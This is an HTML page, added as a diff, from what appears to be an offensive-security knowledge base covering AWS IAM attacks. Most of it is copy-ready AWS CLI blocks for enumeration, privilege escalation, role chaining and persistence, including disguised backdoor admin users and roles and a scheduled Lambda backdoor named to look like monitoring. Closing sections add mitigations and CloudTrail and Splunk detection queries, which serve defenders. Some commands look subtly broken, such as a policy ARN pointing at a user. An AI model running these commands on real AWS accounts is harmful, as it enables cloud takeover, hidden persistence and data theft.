@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AWS IAM Attacks | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .warning-box { background: rgba(255,136,0,0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .warning-box strong { color: #ff8800; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Cloud Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Cloud Security</a> / AWS IAM Attacks
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | T1078.004</span>
+      <h1>🔐 AWS IAM Attack Techniques</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1078.004</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>AWS</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Credential Access</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Medium-High</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>AWS Identity and Access Management (IAM) attacks target the authentication and authorization mechanisms in AWS environments to gain unauthorized access, escalate privileges, and maintain persistence.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why IAM is a Prime Target:</strong>
+        <ul>
+          <li><strong>Centralized Access Control:</strong> IAM controls everything in AWS</li>
+          <li><strong>Privilege Escalation Path:</strong> Misconfigured policies allow privesc</li>
+          <li><strong>Persistence Opportunity:</strong> Create backdoor users/roles</li>
+          <li><strong>Lateral Movement:</strong> Cross-service access via role chaining</li>
+          <li><strong>Hard to Detect:</strong> Legitimate operations blend with attacks</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 2. ENUMERATION -->
+    <div class="content-section" id="enumeration">
+      <h2>🔍 IAM Enumeration</h2>
+      
+      <p><strong>Enumerate Current Identity:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get current identity
+aws sts get-caller-identity
+aws iam get-user
+aws iam list-attached-user-policies --user-name <user>
+aws iam list-user-policies --user-name <user>
+
+# List users
+aws iam list-users
+
+# List roles
+aws iam list-roles
+
+# List groups
+aws iam list-groups</pre>
+      </div>
+
+      <p><strong>Enumerate Permissions:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Simulate policy evaluation
+aws iam simulate-principal-policy \
+    --policy-source-arn arn:aws:iam::123456789012:user/myuser \
+    --action-names ec2:DescribeInstances \
+    --resource-arns "*"
+
+# List permissions for current user
+aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
+
+# Check for Admin access
+aws iam list-attached-user-policies --user-name <user> | grep -i admin</pre>
+      </div>
+
+      <p><strong>Enumerate Service Access:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Try listing various services
+aws ec2 describe-instances --region us-east-1 2>/dev/null
+aws s3 ls 2>/dev/null
+aws lambda list-functions 2>/dev/null
+aws dynamodb list-tables 2>/dev/null
+aws rds describe-db-instances 2>/dev/null
+
+# Check specific service permissions
+aws iam list-user-policies --user-name <user></pre>
+      </div>
+    </div>
+
+    <!-- 3. PRIVILEGE ESCALATION -->
+    <div class="content-section" id="privesc">
+      <h2>🔓 Privilege Escalation</h2>
+      
+      <p><strong>Technique 1: Create New User with Admin Policy:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create backdoor user
+aws iam create-user --user-name backup-admin
+
+# Attach admin policy
+aws iam attach-user-policy --user-name backup-admin \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Create access key for persistence
+aws iam create-access-key --user-name backup-admin</pre>
+      </div>
+
+      <p><strong>Technique 2: Update Existing User's Policy:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create new version of admin policy
+aws iam create-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
+    --policy-document file://admin-policy.json \
+    --set-as-default
+
+# Attach to existing user
+aws iam attach-user-policy --user-name target-user \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</pre>
+      </div>
+
+      <p><strong>Technique 3: PassRole + Lambda:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create Lambda function with reverse shell
+aws lambda create-function --function-name privesc \
+    --runtime python3.9 \
+    --handler exploit.handler \
+    --zip-file fileb://payload.zip \
+    --role arn:aws:iam::123456789012:role/existing-role
+
+# Invoke with assumed role
+aws lambda invoke --function-name privesc</pre>
+      </div>
+
+      <p><strong>Technique 4: Attach Policy to Role:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List existing roles
+aws iam list-roles --query 'Roles[].RoleName'
+
+# Attach admin policy to any role
+aws iam attach-role-policy --role-name <role-name> \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Assume the role
+aws sts assume-role --role-arn arn:aws:iam::123456789012:role/<role-name> \
+    --role-session-name evil-session</pre>
+      </div>
+
+      <p><strong>Technique 5: Create New Version of Policy:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create policy document
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+  }]
+}
+
+# Save as admin.json and apply
+aws iam create-policy-version \
+    --policy-arn arn:aws:iam::123456789012:user/target \
+    --policy-document file://admin.json \
+    --set-as-default</pre>
+      </div>
+    </div>
+
+    <!-- 4. LATERAL MOVEMENT -->
+    <div class="content-section" id="lateral">
+      <h2>🚀 Lateral Movement</h2>
+      
+      <p><strong>Role Chaining:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List all roles and their trust policies
+aws iam list-roles --query 'Roles[*].[RoleName,Arn]'
+
+# Check if you can assume any role
+aws sts assume-role --role-arn arn:aws:iam::123456789012:role/TargetRole \
+    --role-session-name attack-session
+
+# After assuming, export credentials
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...</pre>
+      </div>
+
+      <p><strong>Cross-Account Access:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If you have cross-account role access
+aws sts assume-role \
+    --role-arn arn:aws:iam::TARGET_ACCOUNT:role/AccessRole \
+    --external-id SuspiciousExternalId \
+    --role-session-name cross-account
+
+# Enumerate target account
+aws ec2 describe-instances --region us-east-1
+aws s3 ls</pre>
+      </div>
+
+      <p><strong>Service-to-Service Impersonation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Lambda execution role
+aws lambda add-permission --function-name existing-func \
+    --action lambda:InvokeFunction \
+    --principal 123456789012
+
+# Use Lambda to assume another role
+import boto3
+def handler(event, context):
+    sts = boto3.client('sts')
+    creds = sts.assume_role(
+        RoleArn="arn:aws:iam::123456789012:role/TargetRole",
+        RoleSessionName="attacker"
+    )
+    # Use creds to access target resources</pre>
+      </div>
+    </div>
+
+    <!-- 5. PERSISTENCE -->
+    <div class="content-section" id="persistence">
+      <h2>🎯 Persistence Mechanisms</h2>
+      
+      <p><strong>1. Backdoor User:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create user with admin access
+aws iam create-user --user-name aws-support
+aws iam attach-user-policy --user-name aws-support \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam create-access-key --user-name aws-support
+
+# Save credentials securely</pre>
+      </div>
+
+      <p><strong>2. Backdoor Role:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create role with wide access
+aws iam create-role --role-name aws-deploy \
+    --assume-role-policy-document '{
+      "Version": "2012-10-17",
+      "Statement": [{
+        "Effect": "Allow",
+        "Principal": {"AWS": "arn:aws:iam::123456789012:root"},
+        "Action": "sts:AssumeRole"
+      }]
+    }'
+aws iam attach-role-policy --role-name aws-deploy \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</pre>
+      </div>
+
+      <p><strong>3. Access Key Rotation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create multiple access keys for same user
+aws iam create-access-key --user-name existing-admin
+# Rotate when one gets burned</pre>
+      </div>
+
+      <p><strong>4. Lambda Backdoor:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create Lambda function that runs periodically
+aws lambda create-function --function-name CloudWatchMonitor \
+    --runtime python3.9 \
+    --handler backup.handler \
+    --zip-file fileb://backdoor.zip \
+    --role arn:aws:iam::123456789012:role/existing-role
+
+# Create CloudWatch rule to trigger it
+aws events put-rule --name "DailyCheck" --schedule-expression "rate(1 day)"
+aws events put-targets --rule DailyCheck \
+    --targets Id=1,Arn=arn:aws:lambda:us-east-1:123456789012:function:CloudWatchMonitor</pre>
+      </div>
+    </div>
+
+    <!-- 6. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact Analysis</h2>
+      
+      <div class="vulnerability-box">
+        <strong>Potential Damage:</strong>
+        <ul>
+          <li><strong>Complete Cloud Compromise:</strong> Full control over all AWS resources</li>
+          <li><strong>Data Exfiltration:</strong> Access S3, databases, secrets</li>
+          <li><strong>Cryptojacking:</strong> Spin up mining infrastructure</li>
+          <li><strong>Financial Impact:</strong> Large AWS bills from resource abuse</li>
+          <li><strong>Supply Chain:</strong> Modify Lambda layers, container images</li>
+          <li><strong>Reputational Damage:</strong> Customer data exposure</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 7. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Preventive Controls:</strong>
+        <ul>
+          <li><strong>Least Privilege:</strong> Grant only necessary permissions</li>
+          <li><strong>Permission Boundaries:</strong> Use iam:PermissionsBoundary</li>
+          <li><strong>Service Control Policies:</strong> SCPs to restrict admin actions</li>
+          <li><strong>Regular Audits:</strong> Review IAM policies monthly</li>
+          <li><strong>AWS Config Rules:</strong> Detect overly permissive policies</li>
+          <li><strong>Disable Root:</strong> Don't use root account for operations</li>
+        </ul>
+      </div>
+
+      <p><strong>CloudTrail Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># CloudTrail events to monitor
+- CreateUser, DeleteUser
+- AttachUserPolicy, DetachUserPolicy
+- CreateAccessKey, DeleteAccessKey
+- CreateRole, DeleteRole
+- AssumeRole
+- PutUserPolicy, PutRolePolicy
+
+# AWS Config rules
+- iam-user-no-custom-permissions
+- iam-policy-no-statements-with-admin-access
+- iam-role-managers-should-review</pre>
+      </div>
+
+      <p><strong>GuardDuty Coverage:</strong></p>
+      <ul>
+        <li>PersistedIAMUser/Role creation</li>
+        <li>Unusual IAM activity</li>
+        <li>Privilege escalation attempts</li>
+        <li>Suspicious API calls</li>
+      </ul>
+    </div>
+
+    <!-- 8. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection Queries</h2>
+
+      <p><strong>CloudWatch Logs Insights:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find new admin users
+fields @timestamp, userIdentity.userName, eventName, sourceIP
+| filter eventName like /CreateUser|AttachUserPolicy/
+| filter responseElements.attachments.policyArn like /Administrator/
+
+# Find privilege escalation
+fields @timestamp, userIdentity.arn, eventName
+| filter eventName = "AssumeRole"
+| filter userIdentity.arn like /your-org/
+
+# Find suspicious role assumption
+fields @timestamp, userIdentity.userName, eventName, errorCode
+| filter eventName = "AssumeRole" and errorCode like /AccessDenied/</pre>
+      </div>
+
+      <p><strong>Splunk/Elastic Detection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Detect admin policy attachment
+index=cloudtrail eventName IN (AttachUserPolicy, PutUserPolicy)
+| search responseElements.policyArn=*AdministratorAccess*
+
+# Detect new users
+index=cloudtrail eventName=CreateUser
+| stats count by userIdentity.userName, sourceIP</pre>
+      </div>
+    </div>
+
+    <!-- 9. TOOLS -->
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+
+      <div class="info-box">
+        <strong>Automated enumeration:</strong>
+        <ul>
+          <li><strong>enumerate-iam:</strong> Enumerate permissions in AWS</li>
+          <li><strong>Cartography:</strong> Map AWS resources and relationships</li>
+          <li><strong>PMapper:</strong> Identify privilege escalation paths</li>
+          <li><strong>PrincipalMapper:</strong> Analyze IAM principal access</li>
+        </ul>
+      </div>
+
+      <p><strong>PMapper Usage:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Analyze privilege escalation paths
+python3 pmapper.py --all-accounts --role arn:aws:iam::123456789012:role/TargetRole
+
+# Quick check
+python3 pmapper.py --visualize</pre>
+      </div>
+    </div>
+
+    <!-- 10. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation/" target="_blank">AWS Privilege Escalation</a></li>
+        <li><a href="https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation" target="_blank">IAM Privesc Toolbox</a></li>
+        <li><a href="https://ermedina.github.io/posts/2021/AWS-IAM-Privilege-Escalation/" target="_blank">IAM Attack Techniques</a></li>
+        <li><a href="https://cloudsecguy.com/principalmapper/" target="_blank">PrincipalMapper Guide</a></li>
+        <li><a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html" target="_blank">AWS IAM Documentation</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Cloud Security</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
